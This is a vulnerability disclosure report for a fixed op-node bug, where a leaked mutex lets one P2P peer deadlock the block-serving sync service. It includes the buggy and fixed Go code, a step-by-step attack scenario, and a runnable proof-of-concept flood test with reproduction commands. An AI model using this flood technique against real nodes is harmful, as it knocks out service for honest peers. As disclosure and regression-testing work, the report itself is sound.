# op-node P2P — req/resp sync server returns without releasing `peerStatsLock` when the per-peer rate limiter errors — a single remote peer can permanently deadlock the alt-sync server

| Field | Value |
|---|---|
| **Target** | op-node, `op-node/p2p/sync.go` (`ReqRespServer.handleSyncRequest`, protocol `/opstack/req/payload_by_number/<chainID>/0`) |
| **Asset type** | Blockchain/DLT |
| **Severity** | Low |
| **Impact category** | Denial of service of a node sub-service (P2P alt-sync serving). No Immunefi DLT category matches exactly; the closest is "Shutdown of greater than or equal to 10% or equal to but less than 30% of network processing nodes without brute force actions, but does not shut down the network", applied to the sync-serving function only |
| **Fix commit(s)** | f2ff15dfc7efafb8e216f7cae7479537901fdc74 (PR #16617), 2025-07-10 |
| **Vulnerable since** | 0d7859bbfc (2023-03-16, "op-node: req-resp p2p sync with new feature-flag"). Present in op-node v1.0.3 through v1.13.4. Fixed in **op-node v1.13.5** (2025-07-11) |

## Brief / Intro

op-node includes a small P2P "request/response" service that lets peers ask for specific L2 blocks they missed on gossip ("alt-sync"). It is on by default (`--p2p.sync.req-resp=true`). To stop abuse, the server rate-limits each peer while holding a mutex that protects the per-peer statistics. If a peer's rate-limit wait failed, for example because the peer sent requests faster than the limit allows, the handler returned early **without unlocking the mutex**. Every later request from every peer then blocked forever on that mutex. Any remote peer could trigger this just by sending requests quickly, and it silently disabled the node's block-serving function until the node was restarted, leaking a goroutine and a stream per later request.

## Vulnerability Details

Parent of the fix, `op-node/p2p/sync.go:859-887`:

```go
func (srv *ReqRespServer) handleSyncRequest(ctx context.Context, stream network.Stream) (uint64, error) {
	peerId := stream.Conn().RemotePeer()
	if err := srv.globalRequestsRL.Wait(ctx); err != nil { ... }

	// find rate limiting data of peer, or add otherwise
	srv.peerStatsLock.Lock()
	ps, _ := srv.peerRateLimits.Get(peerId)
	if ps == nil {
		...
	} else {
		if err := ps.Requests.Wait(ctx); err != nil {
			return 0, fmt.Errorf("timed out waiting for global sync rate limit: %w", err)   // <-- lock still held
		}
	}
	srv.peerStatsLock.Unlock()
```

`ctx` comes from `HandleSyncRequest`, which wraps it with `context.WithTimeout(ctx, maxThrottleDelay)`, i.e. 20 seconds from when the stream is accepted. The per-peer limiter allows 4 requests/s with a burst of 15. `rate.Limiter.Wait` returns an error immediately if the context is already done, or if the required delay would exceed the context deadline.

Because the lock is held *while* waiting on the per-peer limiter, concurrent requests from one peer are serialized behind it. Each queued handler's 20-second budget keeps running while it waits for the lock. After roughly 15 + 4×20 = 95 requests from one peer in flight, the next handler to get the lock finds that it cannot get a token before its deadline. `Wait` fails, the function returns with the lock held, and every later `srv.peerStatsLock.Lock()`, from any peer, blocks forever. `sync.Mutex` does not respect contexts, so the 20-second timeout cannot free these goroutines.

Fix:

```diff
 		if err := ps.Requests.Wait(ctx); err != nil {
+			srv.peerStatsLock.Unlock()
 			return 0, fmt.Errorf("timed out waiting for global sync rate limit: %w", err)
 		}
```

The fix commit also added `TestMutexUnlocks` in `op-node/p2p/sync_test.go`, which forces the limiter error path and checks that the mutex can be acquired afterwards.

### Attack scenario

1. The attacker connects to a target op-node as a normal libp2p peer (the node listens publicly by default).
2. The attacker opens about 100–150 concurrent `payload_by_number` streams, each requesting any block number, without reading the responses.
3. Within about 20 seconds one queued handler's `ps.Requests.Wait(ctx)` fails, and the mutex is never released.
4. From then on the node answers no alt-sync request from any peer. Each new incoming stream parks a goroutine forever. The attacker can do this to every reachable op-node, including the sequencer's public P2P nodes, at negligible cost.

Honest heavy use can hit the same path: a single syncing peer issuing many parallel requests, which op-node's own client does in ranges, can trip it by accident.

## Impact Details

- **What breaks:** the P2P alt-sync server on the victim node. Peers that missed gossip blocks can no longer backfill from it. If most public nodes are hit, nodes with gossip gaps have to wait for L1 derivation (safe-head lag, minutes) to progress their unsafe head. Goroutines and open streams grow with each later request, bounded in practice by the libp2p resource manager's stream limits. Those limits are then used up by stuck streams, which may reduce the capacity available to other protocols on that node.
- **What does not break:** consensus, derivation, gossip reception and the safe or finalized chain. The node keeps following the chain.
- **Cost to attacker:** trivial (one peer, about 150 small streams). It needs no privileges and can be repeated after every restart.
- **Duration:** 2023-03 to 2025-07 (op-node v1.0.3 to v1.13.4), with the feature enabled by default.
- **Severity: Low.** This is a real remote DoS, but only of an auxiliary liveness helper, with no effect on safety or core block processing.

## Proof of Concept

Two tests, both run against the **current tree** with Go's `-overlay` flag. The overlay substitutes a copy of `sync.go` with the fix line (`srv.peerStatsLock.Unlock()` inside the error branch, current line 179) removed, so no repository file is modified. The embedded superchain registry zip is not present in this checkout, so the overlay also supplies a stub zip and matching `.sha256` to let the package compile. Neither test uses the registry.

**Test 1: the fix's own regression test, `TestMutexUnlocks`** (`op-node/p2p/sync_test.go`). It forces `ps.Requests.Wait` to fail (limiter `rate.NewLimiter(0, 0)` plus a 1 ms client context) and then checks whether `peerStatsLock` can be acquired.

**Test 2: a realistic flood with no internal state manipulation.** Save as `op-node/p2p/sync_flood_poc_test.go` or provide it through the overlay:

```go
package p2p

import (
	"context"
	"encoding/binary"
	"testing"
	"time"

	mocknet "github.com/libp2p/go-libp2p/p2p/net/mock"
	"github.com/stretchr/testify/require"

	"github.com/ethereum/go-ethereum"
	"github.com/ethereum/go-ethereum/log"

	"github.com/ethereum-optimism/optimism/op-node/metrics"
	"github.com/ethereum-optimism/optimism/op-service/eth"
	"github.com/ethereum-optimism/optimism/op-service/testlog"
)

// One peer floods the server; afterwards a *different* honest peer is refused service.
func TestPoCSyncServerFloodDeadlock(t *testing.T) {
	cfg, payloads := setupSyncTestData(10)
	mockL2 := mockPayloadFn(func(n uint64) (*eth.ExecutionPayloadEnvelope, error) {
		p, ok := payloads.getPayload(n)
		if !ok {
			return nil, ethereum.NotFound
		}
		return p, nil
	})
	srv := NewReqRespServer(cfg, mockL2, metrics.NoopMetrics)

	mnet, err := mocknet.FullMeshConnected(3)
	require.NoError(t, err)
	defer mnet.Close()
	hosts := mnet.Hosts()
	server, attacker, honest := hosts[0], hosts[1], hosts[2]

	ctx := context.Background()
	lg := testlog.Logger(t, log.LevelCrit)
	server.SetStreamHandler(PayloadByNumberProtocolID(cfg.L2ChainID),
		MakeStreamHandler(ctx, lg, srv.HandleSyncRequest))

	for i := 0; i < 150; i++ {
		go func() {
			s, err := attacker.NewStream(ctx, server.ID(), PayloadByNumberProtocolID(cfg.L2ChainID))
			if err != nil {
				return
			}
			_ = binary.Write(s, binary.LittleEndian, uint64(1))
			_ = s.CloseWrite()
		}()
	}
	time.Sleep(maxThrottleDelay + 3*time.Second)

	got := make(chan byte, 1)
	go func() { // honest peer; mock streams are synchronous pipes, so run it off the test goroutine
		s, err := honest.NewStream(ctx, server.ID(), PayloadByNumberProtocolID(cfg.L2ChainID))
		if err != nil {
			return
		}
		_ = binary.Write(s, binary.LittleEndian, uint64(1))
		_ = s.CloseWrite()
		var res [1]byte
		if _, err := s.Read(res[:]); err == nil {
			got <- res[0]
		}
	}()
	select {
	case code := <-got:
		require.Equal(t, byte(0), code)
	case <-time.After(5 * time.Second):
		t.Fatal("honest peer got no response within 5s: sync server deadlocked")
	}
}
```

Commands (overlay files in a scratch directory `$S`):

```bash
R=$PWD   # monorepo root
sed '179d' op-node/p2p/sync.go > $S/sync_buggy.go            # drop the fix line
# stub registry so op-core/superchain compiles:
python3 -c "import zipfile;z=zipfile.ZipFile('$S/sc.zip','w');z.writestr('dictionary',b'');z.writestr('chains.json',b'{}');z.close()"
echo "$(sha256sum $S/sc.zip | cut -d' ' -f1)  superchain-configs.zip" > $S/sc.sha256
cat > $S/overlay.json <<EOF
{"Replace":{
 "$R/op-node/p2p/sync.go":"$S/sync_buggy.go",
 "$R/op-node/p2p/sync_flood_poc_test.go":"$S/sync_flood_poc_test.go",
 "$R/op-core/superchain/superchain-configs.zip":"$S/sc.zip",
 "$R/op-core/superchain/superchain-configs.zip.sha256":"$S/sc.sha256"}}
EOF
go test -overlay $S/overlay.json ./op-node/p2p -run 'TestMutexUnlocks|TestPoCSyncServerFloodDeadlock' -count=1 -v
# fixed: same overlay minus the sync.go entry
```

(On a checkout with the registry built, `just sync-superchain` or equivalent, the stub entries are unnecessary. Alternatively, run the tests directly at `f2ff15dfc7^` and `f2ff15dfc7`.)

**Results:**

- `TestMutexUnlocks`, **Executed: yes.**
  - Buggy (fix line removed): `sync_test.go:193: Mutex deadlock detected - bug exists`, `--- FAIL: TestMutexUnlocks/ErrorCase (1.10s)`.
  - Fixed (current code): `--- PASS: TestMutexUnlocks/ErrorCase (0.10s)`.
- `TestPoCSyncServerFloodDeadlock`, **Executed: yes.**
  - Buggy: `sync_flood_poc_test.go:71: honest peer got no response within 5s: sync server deadlocked`, `--- FAIL: TestPoCSyncServerFloodDeadlock (28.01s)`.
  - Fixed: `--- PASS: TestPoCSyncServerFloodDeadlock (23.01s)`. The honest peer is served normally after the flood.

  This confirms that a single unprivileged peer, sending only well-formed requests, disables the server for everyone else without touching internal state.

## Recommendation

The fix adds the missing `Unlock()`. More robust options:
- Use `defer`, or a small helper that takes the lock, looks up or creates the `peerStat`, and releases it before waiting, so that no early return can leak the lock.
- Do not hold `peerStatsLock` while waiting on the limiter. Fetch `ps` under the lock, release it, then `ps.Requests.Wait(ctx)`. `rate.Limiter` is already goroutine-safe. This removes the serialization that makes the timeout reachable in the first place.
- Cap concurrent in-flight streams per peer for this protocol (reject instead of queueing), and add a lint rule or test for "no return while holding the lock" in P2P handlers.

## References

- Fix commit: f2ff15dfc7efafb8e216f7cae7479537901fdc74
- Pull request: https://github.com/ethereum-optimism/optimism/pull/16617
- Relevant files: `op-node/p2p/sync.go`, `op-node/p2p/sync_test.go`, `op-node/p2p/node.go` (server registration), `op-node/flags/p2p_flags.go` (`p2p.sync.req-resp`, default `true`)
- Specs: https://specs.optimism.io/protocol/rollup-node-p2p.html#req-resp
